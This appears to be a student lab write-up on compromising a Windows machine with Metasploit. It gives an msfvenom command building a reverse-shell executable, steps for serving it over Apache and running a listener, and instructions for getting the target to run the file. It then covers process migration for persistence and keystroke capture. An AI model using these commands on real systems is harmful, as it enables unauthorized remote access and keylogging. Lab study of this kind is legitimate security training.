# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

## OUTPUT
![image](https://github.com/user-attachments/assets/8f48f7b9-3c4f-44f2-9b46-2d9ae60c46e5)

Create a malicious executable file fun.exe using msfvenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT
![image](https://github.com/user-attachments/assets/de2a9fd8-0767-414b-b4ae-9bcf2932651a)

copy the fun.exe into the apache /var/www/html folde

## OUTPUT

![image](https://github.com/user-attachments/assets/f4c9b729-21dd-43e3-8e03-d26fc72e9993)
Start apache server sudo systemctl apache2 start

## OUTPUT
![image](https://github.com/user-attachments/assets/59d6203d-b7d1-4b3c-b2cd-5c3f782bdf6c)
Check the status of apache2

## OUTPUT
![image](https://github.com/user-attachments/assets/4af08e71-b9c5-4bb4-b7bd-a6d49b5091b7)

Invoke msfconsole:

## OUTPUT:
![image](https://github.com/user-attachments/assets/b49acee5-e61d-48bc-9ddd-329268c5fd1f)
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
![image](https://github.com/user-attachments/assets/e30f7396-8087-4a2a-8699-0d683795d21b)

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
## OUTPUT:

![image](https://github.com/user-attachments/assets/cd16d1bb-43ac-43f2-838a-d281c41af67f)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads. Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
## OUTPUT

![image](https://github.com/user-attachments/assets/3178f551-3dcf-45e1-a28a-1c4332c17c22)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
## OUTPUT
![image](https://github.com/user-attachments/assets/38cc3fdd-eabd-4576-a0d6-18db3edf24af)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT
![image](https://github.com/user-attachments/assets/ee382543-6620-4616-91f8-067cfd625821)

keyscan_dump Shows the keystrokes captured so far
## OUTPUT:
![image](https://github.com/user-attachments/assets/d5a302db-bad5-4f70-823f-cca395acc7d2)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
